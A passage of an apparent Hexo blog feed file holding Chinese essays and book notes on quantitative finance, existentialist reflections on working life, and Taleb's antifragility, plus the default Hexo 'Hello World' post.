><p>当你认真检视一件事物，足以将其“质“和”量”统一起来时，任何事情都是很有趣的。当你对某个领域的细微之处足够熟悉，而且开始尝试着将将它的形式和它的应用连接起来的时，任何领域都是很吸引人的。应用物理学能够提供各种各样的任务，提供一个长期理论问题和短期现实问题的组合，提供一个理论指导实践并从中得到乐趣的机会。简而言之，它能够使人在独自研究的执着境界和与人接触的鲜活世界之间随时更新，从容往来。</p><p>叔本华在他的《随笔和箴言集》（Essay and Aphorisms）中写道：“你能做你想要的，但你不能想要你想要的。”当时我正开始阅读这本书，我认为这句话是对的。我已经不能再像以前喜欢研究物理那样想要去研究物理了。在自我挣扎的过程中，我开始体会到叔本华那冷酷无情、愤世嫉俗的世界观和方法论了，所有这些内容都用凝练的短语表达得如此漂亮，读起来就像诗一样。我永远忘不了。叔本华愤世嫉俗的分析与优雅的方式远远胜于史代纳那种对真理不加解释而做出的拙朴的表达，而且这种分析与方式又给人一种更加冷静、客观的慰籍。</p><p>差不多也就是看爱德华所设计和编写的代码时，我意识到很多物理学家是如何误解非学术世界中工作和职业性质了。物理学家总是认为自己很聪明，一旦自降身段从事了“外面世界”的工作，他们的聪明才智能让他们只需要朝九晚五地工作，还能超过其他同事。但是在很多非学术工作中，总是有这样一些人：对他们来说，特定的工作并不是一种妥协，而是一种激情、一种投入，他们非常认真的看到这份工作。是他们，而不是那些聪明但漫无目的的混日子的物理学家，给卓越确立了标准。</p><p>无论如何，正是那些不可预测的“我”们，像你和我一样的人们，决定了金融价值。费希尔·布莱克曾将金融理论写成：</p><blockquote><p>理论最终被接受，并不是因为它被传统的实证检验所验证，而是因为研究者们说服了其他研究者们，使他们相信这里理论是正确的和重要的。<br>我愿意阐述的更深入一些，从交易员合作者角度来看，我喜欢将金融模型水位类似量子物理学家和相对论物理学家在20世纪早期所做的那些想象试验（gedanken）。想象试验，在德国称之为思想实验（though experiment），是想象中的研究，是一种在精神世界里对物理世界做的眼里测试。这种试验之所以在你大脑中进行，是因为实践起来太难而不可能真的操作。他们的目的就是强迫你将关于世界的概念变成一个矛盾体。哎一实验为了深入洞察信仰牛顿学说的观察者和麦克斯韦对光的描述之间的矛盾，曾想象蛋挞坐在一定光速边缘的时候，他将会看到什么。当你坐在一个波峰上时，时候光波看上去仍会是从波峰向波谷变动的？同样的，薛定谔为了强调量子力学完全与直观相反的特性，想象一只看不见的猫，被密封在一个装有放射性原子的盒子里，放射性原子持续衰变，会触发一个盖格尔计数器（Geiger counter）从而释放出毒气。那么这只猫会像不可预测到的、在不同量子形态之间不断来回转换的原子那样，在生死之间不断轮回？</p></blockquote><p>我想这才是将数学模型应用于金融学的正确方式。模型只是模型而已，并不是事情本身。因此，我们不能指望它们是真正正确的。模型最好被视为一组你能研究的平行的实现领域。每个思想领域都应该是一致的，但真实的金融和人类世界与物质世界不同，比我们用来了解它的任何模型都要无限度地更加复杂。我们总是尝试将真实世界硬塞进一个模型中，想看看这个模型是多么有用的一个近似形式。</p><p>我喜欢按照歌德的风格来思考我们在数量金融学领域所做的事情：我们尝试对我们观察到的事物做优美的、如实的描述，这个过程中涉及直觉感知、发明创造已经编制近似的规则和模式。我们在创造理解方面，融合了艺术和科学。我们运用我们的自觉、我们的科学知识已经我们的技巧来描绘出如何进行定性思考，并在一定限制内量化分析人类事务的世界，在这样的过程中，我们影响着其他人的想法，也被其他人的想法影响着。如果没有希望，人在生命中也就不会祈求太多。</p></blockquote>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
          <category> Finance </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/07/30/hello-world/"/>
      <url>/2018/07/30/hello-world/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>“存在主义”的荒诞表述</title>
      <link href="/2018/07/10/%E2%80%9C%E5%AD%98%E5%9C%A8%E4%B8%BB%E4%B9%89%E2%80%9D%E7%9A%84%E8%8D%92%E8%AF%9E%E8%A1%A8%E8%BF%B0/"/>
      <url>/2018/07/10/%E2%80%9C%E5%AD%98%E5%9C%A8%E4%B8%BB%E4%B9%89%E2%80%9D%E7%9A%84%E8%8D%92%E8%AF%9E%E8%A1%A8%E8%BF%B0/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在国企上的这两年班，尤其是经常性的出差，全国各地的奔波，发现这真的是一种适合思考哲学的生活状态，尤其是在飞机上透过舷窗看着平流层下云舒云展，或者高铁上看着阡陌交通，这个时候哲学灵感尤为强烈。</p><p>单位距离单位有二十公里的距离，又因为上班的必经之路是交通要道，所以每天按点起床仍是告别学校之后一项严峻的考验，提示我们生活的第一件事就是违背自己的意愿。</p><p>一个相信绝对真理的理性主义者来到现实世界的大荒漠之后，很容易就被改造成一个存在主义的信徒。因为发现所有的书面真理遭到鲜活的生命之后就会原形毕露，正如存在主义的先驱克尔凯郭尔不满于黑格尔哲学大厦无法提供安身立命的教诲而转向了主管性，赋予自身生存状态以本体论的意义。</p><p>我的室友阿诺，最近就陷于存在主义的荒诞之中，这个自由派青年出于工具理性光荣地成为了一家百年国企的文宣员，每天都在拷问自己人生的意义，并且提出了更具有本体论色彩的问题：我为什么没有钱？是不是二十五岁的我，注定要为没钱而流眼泪？</p><p>这个时候我就会给他背一段高中课文：“盖文王拘而演《周易》；仲尼厄而作《春秋》……“只有幻灭才能成就伟大的作品，把生活经历淬炼成艺术，说不定救火了，然后实现财务自由。接着，我又背一段高中课文：”天将降大任于斯人也……“于是微信群里充满了快活的气息。</p><p>但后来我发现，为了掩饰庸常而建构的意义，并不能解决阿诺的精神问题，在进入国企前，他也曾是个深邃而富有批判精神的青年，很容易识破所有忽悠人的意义。既然建构伟大不管用，我就改变策略，开始悬念直面残酷，怂恿他辞职，去追寻我被没有选择的人生——做个好记者。但很遗憾，阿诺寻死觅活的俩个月依然没有辞职，而我终于也明白了他就像《邪不压正》里面的李天然，十几年心心念念想要报仇，但真正面对仇人的时候却无法克服内心的恐惧，虽然我觉得姜文对这一心理状态的刻画非常庸俗。阿诺不敢辞职的原因更加庸俗——户口和房租。</p><p>最近房租又涨了，舆论场上充斥着“失控的房租正在榨干年轻人”的悲情控诉，而这些控诉又反过来拔高房东和房客对于房租的预期。正如黑格尔名言所说：“一切重大的历史事件和人物，一般来说都会出现两次。”黑格尔的意思是一旦同样的事情再次发生，那就意味着，这件事情具有深层的历史必然性。</p><p>两年前我读研究生一年级的时候管我们这代大学生叫“预备中产阶级”：“其特征是受过良好的高等教育（985、211毕业生），在大众媒体时代掌握知识和话语权，却没有相应的经济支撑（焦点在房产）的青年群体，他们对中产阶层生活方式进行模仿，对大资本控制展现批判精神，对底层表达仪式性同情。而今天弥漫在这批青年中的不满，是因为预备中产‘转正为中产阶层的渠道被凝滞了。”而今天，文化资本、受教育水平、媒介话语权——它还有许许多多的名字——与经济地位之间的龃龉愈发凸显，于是北京焦虑被放大为中国问题，“北京之所以能焦虑，同样是交通和资讯发展的结果，让无数人站在这里，试图抛弃身后的中国，瞭望新的中国。”</p><p>写这篇文章的时候正值房价又一轮暴涨，但当时我毕竟住着中关村1080元/年的学生宿舍，正如金庸在《倚天屠龙记》后记里所写：“……书中写得太也肤浅了，真实人生中不是这样的。因为那时候我还不明白。”后来自己租了房，拿到第一个月惨不忍睹的工资，再看这些问题，便无法置身事外，多了一些窘迫，少了许多从容，也时不时在出租房或者通勤路上发出许知远式的质问：“读圣贤书所为何事啊！”当然许老师已经实现了财务自由，不会在这等庸俗层面上提问。</p><p>写到这里，有人可能以为，阿诺是我杜撰出来借以自我说服的人物，但实话说不是的，阿诺是我活生生黑胖胖的室友，最近在办公室坐多了可能还胖了好几斤，而我说的也都是真事，并没有用什么文学修辞。</p><p>但我确实有自我说服的工作要做：全中国最好的高等教育不但不能让你月薪两万，而且不能让你自信地面对生活与未来，反而可能成为困扰的来源，让财务理想和薪资现实之间的落差更加扎眼。所有的哲学词汇遭遇生活的时候都很可能完败，存在主义的终极表达就是：X你X的！<br>虽然我清醒地认识到，当初无论我选择哪条路，读博士也好，做记者也好，做公务员也好，进国企也好，都会面临今天的困境。个人的困扰总是和时代的症候铰接在一起的，何况你站立的地方是北京。</p><p>而所有高级低级的鸡汤故事都在告诉我们，人生起伏，有崖边跌落的挫折，也有插画游街的风光，沉潜而不气馁，鱼跃只需尽力，总有办法突围前行。</p><p>我采取的第一个突围方式是做菜，寄情于庖厨之间。工作两个月后，我已经学会了熟练煲火腿汤，做剁椒鱼头，煎牛排，还有功臻化境的蛋炒饭。从今天起，关心粮食和蔬菜，土豆0.99元/斤，西瓜前段时间是0.79元/斤，现在天气转冷是1.39元/斤。拥抱生活，虽然我刚X他妈的。</p><p>第二个突围方式是读书、写稿、写论文、跟人讨论问题，假装自己从未远离知识和媒体。我永攀文学高峰，读完了腰封上号称“超越《百年孤独》的惊世之作”《2666》，用我读博同学的话说，读完这本书基本属于“国家顶尖人才”了；我乐此不疲地在微信群里跟我导师争论，仿佛自己仍然是那个在讨论课上剑拔弩张的思想青年；我研究起新时代的通三统，搞一搞具有汉唐气象的马克思主义儒学（简称唐马儒）；我为媒体撰稿补贴家用，和朝九晚五的健康作息抗衡，抵抗下班回家胖瘫的诱惑，在午夜敲打着并不伟大的作品。而这些努力的意义都如阿兰·德波顿所言：“借由那些更为沉重和骇人的事件，我们得以将自己从琐事中抽离，让更大的命题盖过我们方寸前的忧虑和疑惑。”</p><p>第三个突围方式是理解并且热爱自己的本职工作。我开始理解国企的工作方式，这是一个看起来并不美好的科层制体系，设定目标，拆解任务，然后各人完成各人的部分，连写稿亦如是，并不需要什么天才，但如此反而是一种高效且差错最小的工作方式，与工业社会相契合，这是一个人力不可抵抗的理性化过程。但正是这个生产制度推进了工业化，提升了人均寿命和粮食产量，完成了最本质的“社会进步”。相比之下，学院里的论文写作实在像是小农社会的知识生产，而许多智识优越的教授可能是一群小农知识分子，而大学，至少是文科，可能是农业社会最后的堡垒，它们守卫着那些伟大的灵魂和文本，等待它们命定的读者顺手拿来激活我们时代的困扰。</p><p>最后也是俗气而无用的突围就是规划未来。料你出走半生，终将归来读博。但我依然不觉得毕业决心走出学校是一个错误，尽管立志做个知识青年，书读到我当时那个阶段，已经遭遇了瓶颈，未曾经历的生活不值得审察，所以需要来这花花世界历练一番。</p><p>这里要引用我很喜欢的赖特·米尔斯的名言，他说：“具有社会学的想象力的人，就更有能力在理解更大的历史景观时，思考它对于形形色色个体的内在生命和外在生涯的意义。”</p><p>国企的工作让我慢慢觉得，社会科学最难的题目，恐怕是搞清楚五百块钱对形形色色的个体来说意味着什么？对通勤地铁上哈欠连连的白领意味着什么？对出租房楼下收废品乐呵呵的大妈意味着什么？对于永辉超市里的收银员意味着什么？它涵盖了经济运行、阶级利益、社会分配、群体心理、媒介感知等一系列社会科学问题，搞清楚了就是一部出色的《中国社会各阶级的分析》。换而言之，能够比较准确衡量五百块钱对于某个个体或群体的分量，是社会学的终极想象力之一。这个问题有很多现实应用领域，比如个税起征点改革、社保计提比例调整到底会导向什么样的社会情绪。之所以想这个问题也并不仅仅是因为我真的很穷。</p><p>但我至今还没问过楼下收废品大妈五百块钱意味着什么，“社会学的想象力”止步于想象，无法给出任何具有扎实调查基础的解释和结论。如果我真的是一个社会科学家，这就意味着一种社会科学的失能。但遗憾的是，这种失能症弥漫于当代知识界，喋喋不休争吵各方的批判与想象总是先于理解和解释，而这成为社会科学的阿克琉斯之踵，把社会科学家变成理工科口中“聒噪的文人”，也时时威胁着社会科学的存在基础。所以我一头扎入了生活。</p><p>我依然怀念2016年冬天和阿诺在南方某城市参加学术会议的日子，那时候的我经过了几个月的苦闷，突然用“预备中产之殇”打开了所有的思路，好像恨不得一下子燃烧尽自己的才华与创造力，一天能写出五千字的论文、随笔或者讲稿。我记得那时候我和阿诺说，以后我们要做中国的默顿和拉扎斯菲尔德，你负责调查研究，我负责理论建构。广东的12月居然可以穿短袖。</p><p>希望我们归来依然是少年。</p>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>解读量化投资：西蒙斯用公式打败市场的故事</title>
      <link href="/2018/07/05/%E8%A7%A3%E8%AF%BB%E9%87%8F%E5%8C%96%E6%8A%95%E8%B5%84%EF%BC%9A%E8%A5%BF%E8%92%99%E6%96%AF%E7%94%A8%E5%85%AC%E5%BC%8F%E6%89%93%E8%B4%A5%E5%B8%82%E5%9C%BA%E7%9A%84%E6%95%85%E4%BA%8B/"/>
      <url>/2018/07/05/%E8%A7%A3%E8%AF%BB%E9%87%8F%E5%8C%96%E6%8A%95%E8%B5%84%EF%BC%9A%E8%A5%BF%E8%92%99%E6%96%AF%E7%94%A8%E5%85%AC%E5%BC%8F%E6%89%93%E8%B4%A5%E5%B8%82%E5%9C%BA%E7%9A%84%E6%95%85%E4%BA%8B/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>《解读量化投资：西蒙斯用公式打败市场的故事》由机械工业出版社于2010年1月1日出版。本书讲述詹姆斯·西蒙斯，基金领域的拓扑学大腕，成功取代保尔森的对冲之王，20年内最佳赚钱基金经理，在投资界掀起了一场量化投资的狂潮。《解读量化投资：西蒙斯用公式打败市场的故事》用轻松、幽默的讲故事手法，解读了西蒙斯量化投资“黑箱”之内的秘密。通过深入浅出地回顾西蒙斯的投资布阵，比较西蒙斯与巴菲特投资模式的迥异，分析投资领域技术分析方法和宏观分析方法的优劣，《解读量化投资：西蒙斯用公式打败市场的故事》带我们走近了20年中平均每年总回报为80%的大奖章基金，看看它如何能将1万元变成1亿元。用数学公式打败市场，投资并非悬而未决的事情——这就是《解读量化投资：西蒙斯用公式打败市场的故事》揭示的投资之道。<br><a id="more"></a></p>]]></content>
      
      <categories>
          
          <category> 随想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>高频交易员</title>
      <link href="/2018/06/11/%E9%AB%98%E9%A2%91%E4%BA%A4%E6%98%93%E5%91%98%EF%BC%88Flash%20Boy%EF%BC%89/"/>
      <url>/2018/06/11/%E9%AB%98%E9%A2%91%E4%BA%A4%E6%98%93%E5%91%98%EF%BC%88Flash%20Boy%EF%BC%89/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>《说谎者的扑克牌》《大空头》作者迈克尔•刘易斯最新作品</p><p>英国《金融时报》和麦肯锡2014年度商业类入围好书</p><p>美国上市一周，狂销13万册！</p><p>2014年苹果电子书店下载，非虚构类第一名！</p><p>一场运用网络交易技术与精密算法的大对决</p><p>一场抗衡超级金融系统与权贵人士的大挑战</p><p>一场直面股市交易内幕与监管之惑的大辩论</p><p>千分之十三秒能做什么？你还来不及眨一次眼睛，但对于高频交易员而言，足够完成一次交易。</p><p>美国有多少个股票交易所？你很可能以为，只有两家：纽约证交所和纳斯达克。错！今天，美国股市有超过13个公开交易所，此外，几乎各大券商都有属于自己的秘密交易平台，俗称“暗池”。</p><p>这是一个隐蔽且被操控的市场，高频交易员利用纳秒级（十亿分之一秒）的时间差，捕捉“猎物”，快速买入卖出，谋取暴利。这是“暗池”里的“游戏”，速度就是一切，为此，他们甚至开山破土，建起了一条有史以来最笔直的数据传输光缆。</p><p>一群华尔街的奇异人士发现了这个秘密，他们是一群智力超群的反叛者，他们密谋揭秘金融市场的疯狂，揭露华尔街上那些大银行、股票交易所、高频交易公司赚取暴利的新把戏。《高频交易员》曝光了全球金融市场中不为人知的内幕，对当今世界快速演变的金融工具进行反思，并回答了这样一个问题：到底是谁在操纵市场？<br><a id="more"></a></p>]]></content>
      
      <categories>
          
          <category> 随想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>反脆弱-纳西姆</title>
      <link href="/2018/06/05/%E5%8F%8D%E8%84%86%E5%BC%B1-%E7%BA%B3%E8%A5%BF%E5%A7%86/"/>
      <url>/2018/06/05/%E5%8F%8D%E8%84%86%E5%BC%B1-%E7%BA%B3%E8%A5%BF%E5%A7%86/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>这一篇就强调无序性。看似矛盾，实际却微妙的统一在同样的生物体上，这两者是怎么巧妙的联系起来的，就是我未来要解决的问题。</strong></p><p><strong>此文想要说的是，生活其实是一场无常世界里的狩猎游戏。关键是你要了解上帝是如何制造这些游戏规则的。什么是随机性，非线性，复杂性。为何稳定只存在于波动性之上，为何要在波动中收益。为何复杂性导致任何心灵鸡汤般的善意说教和庞大美好的计划失效。我们又如何在任何情况下都不需要焦虑而是不停发起进攻。 而这场随机游戏的杀手锏，是所谓杠铃对冲法则，在不利中划出有利。</strong></p><a id="more"></a><p><strong>引子：</strong></p><p><strong>“这个世界的本质是风，你要先变成飘忽的火苗，才能越烧越旺”</strong></p><p>我想推荐的，是一套个人风险管理机制。</p><p>什么叫反脆弱，反脆弱是脆弱的反面，但是脆弱的反面不是强韧吗？错了。经过巨大打击， 如果你消沉了，我说你是脆弱的。如果你跟什么没发生一样，那么我说你是强韧的。但是反脆弱说的是，惊受打击，让你更好。 也就是说脆弱是负数，强韧是零，而反脆弱就是正数。</p><p><strong>一句话说：杀不死你的让你更强大。</strong></p><p>中国孩子经受的所有教育让我们避开困难，规避风险，走尽可能成熟的人生路线。注意卫生，饭前饭后洗手，不要进酒吧游戏厅，不要早恋……所谓阳关少年的早餐。</p><p>但是反脆弱的世界观给你上的是一道黑暗料理。有多黑？ 黑到去主动接触有毒性的东西，从而获得更强的免疫力，就像真正的大天朝的黑暗料理。</p><p>为什么要有反脆弱？阳光少年的早餐不好吗？面包牛奶还有学校里善良有爱的书，教你努力就会成功，好好读书，尊老爱幼，然后你的前辈那样成为飞翔的超人。</p><p>但是当你一步与真实的世界接触。你发现读书可以读成脑残博士（像我一样28还写校内），尊老可能摊上麻烦，而父母更不是总是好人， 超人都是忽悠出来的，而你读的每一个教材可能都写着两个字：吃人。</p><p>只吃过阳光早餐的小羊在经受的初冬的第一场雪后，或者冻死了，或者消沉，任风雪强奸。</p><p>我来自一个物理的世界，一个理想模型的世界，清晰有序就是我们的目标，物理的人生观是一个最优化问题。这来自古老的拉格朗日力学，一切物体运动的轨迹均与自然界的某种最小化法则有关，光总沿直线传播，因为光的路径最短。把这样的想法抬到人世。就是每个人做每件事都有清晰的意义，当确定了意义，我么就可以去做有益的事，远离有害的事，就达到了人生的最大化。</p><p><strong>但事实上是，在真实的世界里，一件事的影响从来难以确定，而意义清晰更是幻觉。主宰世界的，是随机性，是复杂性，是非线性。佛教称之为无常。</strong></p><p>复杂是清晰有序的反面，随机是确定的反面。而这里的随机性，并非你所学的概率统计的随机性，这不是投硬币，投上一百次，你就有一个0.5的概率。概率这个概念本身，其实就是个理想模型，它背后的假设是事物的性质不随时间变化,所以你可以试上一百次确定这个数。可是真实的世界里，无论是毛泽东发动文化大革命，还是你昨天和你女朋友分手了，都是千万个因素的偶然结合，就像你我存在的本身。这些事件，你不可回到过去重复它们，经典的概率难以应用其上。但是他们却主宰我们生活的几乎所有，所谓黑天鹅，其实就是白天鹅（黑天鹅=偶然性，白天鹅=常态，偶然性才是常态）。</p><p><strong>无常，使得具有高度计算性和预测性的策略在复杂系统面前难以施展。</strong></p><p>这，就是这个世界从来的真实，它不是一部叙事清晰的史诗，我们所曾经所信仰的，经典里所赞美的，纯洁的爱情，伟大的革命，都不存在，有的是什么？ 存在。存在是什么？ 存在就是活着，是对“无常” 的适应。任何一种存在乃至理念本身，都源自对无常的适应。存在存在了，因为其它毁灭了，在无常的世界里，没有被毁灭的就是存在了，我们就想赋予它合理性，于是我们说存在即合理，其实是循环论证。</p><p><strong>或者说能够在真实世界笑傲江湖的，都是风险偏好者，能够在这种随机无常中汲取营养的而不是被打击的，能够从噪音中获得稳定性的（乱乱更健康）。所谓反脆弱。</strong></p><p>一个虚拟的例子是金庸小说的男主角们。他们往往都有过一段掉下悬崖，身患绝症，幼年丧母之类的超乎寻常的无常经历，然后呢，他们不仅靠着无比强大的英雄乐观主义活了下来，还遇到一两个白胡子老头传授九阳九阴真经，吸星大法一类，成为高手，还碰的大美人赢得芳心。 这就是反脆弱。</p><p>还有一写我朋友的例子。我的一个同学曾经的求学经历饱经岁月调戏，去了一大堆地方不停被排挤，感情也屡遭重创。但是他就凭一句话“ 倒了？起来，拔刀干！” 就拼到欧洲欧洲原子能中心。 为什么呢？ 其实一个人从来没有只交好运，或坏运，只是因为你往往活不到时来运转。他每年失败的那些经历反而是帮他淘汰了一些不好的机会，叫他等好机会到来的时候还是自由身，相比那些过早订了终身的前辈，他赢来了他的时代。而且他在挫折中培养的成熟，逐步让他形成别人无法拥有，女人无法抵御的人格魅力。当你经历挫折，你收获成熟度。</p><p>楚汉之争，刘邦十战九负，而项羽十战九胜，然最后刘邦胜。刘邦可以从不利性的冲击中吸取力量，每次打击都使他更强，而项羽反之，那么当最后一个黑天鹅飞起（刘邦的好运），刘邦就奠定胜局。刘邦，就是反脆弱性的化身。一个快五十的中年大叔，人生loser，然后成为芒砀山一群快饿死的乞丐头，最后成为天下共主。</p><p>而脆弱性的典型呢，我之前分享的那个清华男生，申请美国，本来被康奈尔录取，结果911给耽搁了。后一年申请，又沉迷下棋给耽搁了，之后就隔绝人世。其实错误并不可怕，错误不过是噪音，而世界充满噪音。他完全可以在大北京找个新东方干上一段，说不定找个漂亮女老师，在某次幸运的申请中来到加州海边，总之完全不同的生活。</p><p>他却走向自我的深渊，根源在他性格的脆弱性，脆弱性的特点就是无限放大一个微小的过失（术语叫对噪声敏感），或者说脆弱性的系统无论多完美，只要拿到空气里碰到一个污点就完了。所谓千里之堤，毁于蚁穴，是因为那堤坝本已具备了脆弱性的品质。</p><p>世界是无常的，但有人在无常面前消亡，有人在无常面前壮大，确是不争的事实。我想说我们不能掌握的是无常，但是可以把握的是面对无常的策略。<strong>所以我要说的人生策略，其实不是一场拉格朗日优化，而是随机算法，大自然处理无常早有其方法，而我们把它提炼成人生处事的策略， 即反脆弱技术。</strong></p><p><strong>在无常的世界面前，对风险的害怕远比风险本身可怕。所以，第一，战略上藐视它。</strong></p><p><strong>黄金法则1： 赞美无常。当你在内心里感到无常的优美，你就先在心理上获得了免疫。</strong></p><p>我说复杂性和随机性是美的，因为它其实是宇宙的创造性力量，它摧毁，破坏，并选择强者，让宇宙常常更新，常常进步。就像印度教的那位大神Shiva，她优美的舞蹈包含着毁灭世界的力量，因毁灭而创造。人生的优美，在颠覆性和建设性的力量的博弈平衡，发生在你身上的无常，是在赋予你新生。</p><p><img src="/2018/06/05/反脆弱-纳西姆/大神Shiva.jpg" alt=""></p><p><strong>Shiva的创世之舞，随着她的舞蹈毁灭与创新的轮回周而复始。</strong></p><p><strong>对于悲观主义者，其实还有一个挺灵的招 - 置底法。置于死地而后生。看看最坏情况究竟有多可怕，和个体的死亡，宇宙的热寂比一比，看看还有什么，你反而获得勇气。</strong></p><p><strong>由此引发的方法论：活着。。</strong></p><p>活着就是胜利。理想实现的前提是活着。<strong>对于无常，最后的得胜者是那些在各种无常变化里特别能活的人。</strong> 有的时候这些人是因为难得糊涂而存在下来，比如说文革后一些文人自杀了，一些则挺过来了（去看看电影归来里的大卫和陆焉识）。活着就会有等到好运，或者说正面黑天鹅出现的可能。<strong>但活着本身包含的技巧几乎是要穷尽你的天资和所学，往往那些爱好广泛的人会比较容易，请见后面的纲领法则。</strong></p><p><strong>黄金法则2： 非线性思维</strong></p><p>复杂系统的运转之所以复杂，源自其组成元素之间的非线性相互作用。在这里，1+1等于2的机会几乎为零，它大于二或者小于二，复杂系统的元素之间通过非线性作用关系组成复杂网络，其具有的复杂因果关系，往往非我们穷思竭虑所能达。</p><p><strong>由此引出的方法论1： 试错万岁。面对复杂，我们要的是简单明快的法则而非精确的设计</strong></p><p>所以我之前说面对复杂性，我们最好的办法就是不停试错，任何过度思考和过度计划是多余的。 最典型的例子是计划经济的失败，当你指着复杂系统的鼻子叫它往南，它却往往一路向北。</p><p>但自然在组建生物系统那么精美的装置的时候，无非运用了一个选择算法，第一，生物系统可以通过变异无限试错，第二，只有能够适应外界变化的个体可以把它的基因传给后代。两个简单的办法，加上一定的运算时间（进化史）就产生了无比有效却能够抗击各种自然灾难的生物体。</p><p><strong>大自然的算法，你也能掌握，人类发明了进化算法，而生活中的进化算法就是多给自己先选项，多弄点备胎，然后快速试错，积累经验，稍作改进，继续试错，继续改进。</strong></p><p><strong>由此引出的方法论2：小心规模效应。</strong></p><p> 由于一个复杂系统内元素之间往往呈现复杂的关联。系统的规模越大，就越脆弱。想像一下美国纽约的双子大厦。当911恐怖袭击来临，被困的人根本无法逃离，天堂变成人间地狱。</p><p>如果你知道墨菲法则，你会更加理解这点。墨菲法则说，如果一个系统可能出错，它终将出错。 其实这就是描述基于复杂性产生的脆弱性。当一个过程，一个系统，充满相互关联的步骤或者元素，而过于复杂，它的崩溃几乎是一个时间问题。 因为这样的系统由于非线性效应，一个元素的损坏将导致整个系统的损坏。 而由于系统内原件过多，出现一个原件损坏是早晚的事情。所以如果可能出错，终将出错。</p><p>但是自然里通过进化留下的复杂系统，却往往可以修正因为规模效应导致的脆弱。比如人类的大脑，大脑有10亿级别的神经元数量，其实很多原件是类似的功能，即使丢掉一部分也可以正常运转。有的人被切去半脑却可以正常生活，即是证明。</p><p><strong>自然执行一套强有力算法反抗规模化带来的脆弱性，最重要的就是改变串行为并行。 学过电路的大家都知道，一个串联电路一个灯泡憋了电路就完了，而一个并联的就没事情。</strong></p><p>大自然在进化中形成的多做备胎并且将其并联的方法，其实是反脆弱的无奈选择。</p><p>这样的算法对我们的生活极有借鉴意义。想一下你要把生活分为互相补充的部分，一个坏了还可以上另一条线是多么重要。</p><p>还有，一个长的任务最好分解为小的可以分别收益的部分，这个程序员写程序都明白，程序要写成一个个独立的包而不是无穷长<strong>。你的工作或者任务，最好具备的性质就是可以分为小部分，并且每部分完成你都可以结算马上脱身，这样在变化迅速的局势里才可以时时做或大或小的调整。</strong></p><p><strong>注：中国的很多悲剧都来自对规模效应导致的墨菲法则的忽视。我们追求集中，追求高大全，却忽视小即美。中国的改革举步维艰，也是规模之患。</strong></p><p><strong>黄金法则3： 分布大于平均 - 分布函数的世界观</strong></p><p>对于经典物理的系统，平均数往往占支配性作用，热力学里衡量物理属性的各个量，从温度，到压强都是平均数。但是平均数在复杂系统面前，往往不堪一击。其原因在于-分布函数。</p><p>分布函数是对随机事件的最佳描述方法， 